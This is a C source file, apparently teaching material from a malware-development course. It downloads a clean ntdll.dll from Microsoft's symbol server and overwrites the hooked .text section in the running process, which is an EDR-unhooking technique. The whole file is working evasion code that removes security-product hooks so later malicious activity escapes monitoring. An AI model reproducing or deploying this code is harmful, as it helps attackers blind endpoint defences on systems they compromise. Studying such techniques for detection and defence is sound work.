#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <wininet.h>

#define FIXED_URL	L"https://msdl.microsoft.com/download/symbols/ntdll.dll/"

// function used to read a file from 'szUrl'
// returning the size ('sNtdllSize') and the base address ('pNtdllBuffer') of the read buffer
BOOL GetPayloadFromUrl(
	_In_ LPCWSTR szUrl, 
	_Out_ PVOID* pNtdllBuffer, 
	_Out_ PSIZE_T sNtdllSize
) {

	BOOL		bSTATE			= TRUE;

	HINTERNET	hInternet		= NULL,
				hInternetFile	= NULL;

	DWORD		dwBytesRead		= NULL;
	
	SIZE_T		sSize			= NULL; 	 			// Used as the total size counter
	
	PBYTE		pBytes			= NULL,					// Used as the total heap buffer counter
				pTmpBytes		= NULL;					// Used as the tmp buffer (of size 1024)

	// Opening the internet session handle, all arguments are NULL here since no proxy options are required
	hInternet = InternetOpenW(L"MalDevAcademy", NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Opening the handle to the ntdll file using theURL
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Allocating 1024 bytes to the temp buffer
	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		// Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Calculating the total size of the total buffer 
		sSize += dwBytesRead;

		// In case the total buffer is not allocated yet
		// then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			// Otherwise, reallocate the pBytes to equal to the total size, sSize.
			// This is required in order to fit the whole ntdll file bytes
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		// Append the temp buffer to the end of the total buffer
		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		// Clean up the temp buffer
		memset(pTmpBytes, '\0', dwBytesRead);

		// If less than 1024 bytes were read it means the end of the file was reached
		// Therefore exit the loop 
		if (dwBytesRead < 1024) {
			break;
		}

		// Otherwise, read the next 1024 bytes
	}

	// Saving 
	*pNtdllBuffer	= pBytes;
	*sNtdllSize		= sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);											// Closing handle 
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);										// Closing handle
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
	if (pTmpBytes)
		LocalFree(pTmpBytes);													// Freeing the temp buffer
	return bSTATE;
}

PVOID FetchLocalNtdllBaseAddress(
	_In_
) {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after 'DiskHooking.exe')
	// 0x10 is = sizeof(LIST_ENTRY)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	return pLdr->DllBase;
}

BOOL ReadNtdllFromServer(
	_Out_ PVOID* ppNtdllBuf
) {

	PBYTE	pNtdllModule			= (PBYTE)FetchLocalNtdllBaseAddress();
	PVOID	pNtdllBuffer			= NULL;
	SIZE_T	sNtdllSize				= NULL;
	WCHAR	szFullUrl	[MAX_PATH]	= { 0 };

	// getting the dos header of the local ntdll image
	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	// getting the nt headers of the local ntdll image
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// constructing the download url 
	wsprintfW(szFullUrl, L"%s%0.8X%0.4X/ntdll.dll", FIXED_URL, pImgNtHdrs->FileHeader.TimeDateStamp, pImgNtHdrs->OptionalHeader.SizeOfImage);
	wprintf(L"[+] Download Link Is : %ls\n", szFullUrl);
	printf("\t[i] Downloading ... ");
	// 'GetPayloadFromUrl' is used to download a file from a webserver
	if (!GetPayloadFromUrl(szFullUrl, &pNtdllBuffer, &sNtdllSize))
		return FALSE;
	printf("[+] DONE \n");
	// 'sNtdllSize' will now contain the size of the downloaded ntdll.dll file
	// 'pNtdllBuffer' will now contain the base address of the downloaded ntdll.dll file

	*ppNtdllBuf = pNtdllBuffer;

	return TRUE;
}

BOOL ReplaceNtdllTxtSection(
	_In_ PVOID pUnhookedNtdll
) {

	PVOID			pLocalNtdll = (PVOID)FetchLocalNtdllBaseAddress();

	printf("\t[i] 'Hooked' Ntdll Base Address : 0x%p \n\t[i] 'Unhooked' Ntdll Base Address : 0x%p \n", pLocalNtdll, pUnhookedNtdll);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();


	// getting the dos header
	PIMAGE_DOS_HEADER	pLocalDosHdr = (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr && pLocalDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	// getting the nt headers
	PIMAGE_NT_HEADERS pLocalNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr->e_lfanew);
	if (pLocalNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;


	PVOID		pLocalNtdllTxt	= NULL,	// local hooked text section base address
				pRemoteNtdllTxt = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize	= NULL; // the size of the text section


	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

	for (int i = 0; i < pLocalNtHdrs->FileHeader.NumberOfSections; i++) {

		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {

			pLocalNtdllTxt = (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);
			sNtdllTxtSize = pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}

	printf("\t[i] 'Hooked' Ntdll Text Section Address : 0x%p \n\t[i] 'Unhooked' Ntdll Text Section Address : 0x%p \n\t[i] Text Section Size : %d \n", pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;

	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
		printf("\t[i] Text section is of offset 4096, updating base address ... \n");
		// if not, then the read text section is also of offset 4096, so we add 3072 (because we added 1024 already)
		pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pRemoteNtdllTxt + 3072);
		// checking again
		if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
			return FALSE;
		printf("\t[+] New Address : 0x%p \n", pRemoteNtdllTxt);
		printf("[#] Press <Enter> To Continue ... ");
		getchar();
	}

	printf("[i] Replacing The Text Section ... ");
	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);

	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE !\n");

	return TRUE;
}

int main(
	_In_ VOID
) {

	PVOID	pNtdll = NULL;

	printf("[i] Fetching A New \"ntdll.dll\" File From \"winbindex.m417z.com\" \n");

	if (!ReadNtdllFromServer(&pNtdll))
		return -1;

	if (!ReplaceNtdllTxtSection(pNtdll))
		return -1;
	
	LocalFree(pNtdll);

	printf("[+] Ntdll Unhooked Successfully \n");

	printf("[#] Press <Enter> To Quit ... ");
	getchar();

	return 0;
}